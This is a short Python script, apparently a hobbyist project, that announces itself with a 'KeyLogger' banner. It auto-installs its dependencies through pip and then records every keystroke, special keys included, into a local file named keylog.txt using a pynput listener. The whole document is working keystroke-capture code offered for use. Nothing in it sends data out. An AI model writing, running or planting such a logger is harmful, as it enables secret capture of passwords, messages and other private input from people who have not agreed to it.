try:
    import pyfiglet
except ModuleNotFoundError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyfiglet"])
    import pyfiglet

try:
    from pynput.keyboard import Key, Listener
except ModuleNotFoundError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    from pynput.keyboard import Key, Listener

banner = pyfiglet.figlet_format("KeyLogger\n~Devansh Goyal")
print(banner)

def on_press(key):
    with open("keylog.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f'[{key}]')

with Listener(on_press=on_press) as listener:
    listener.join()
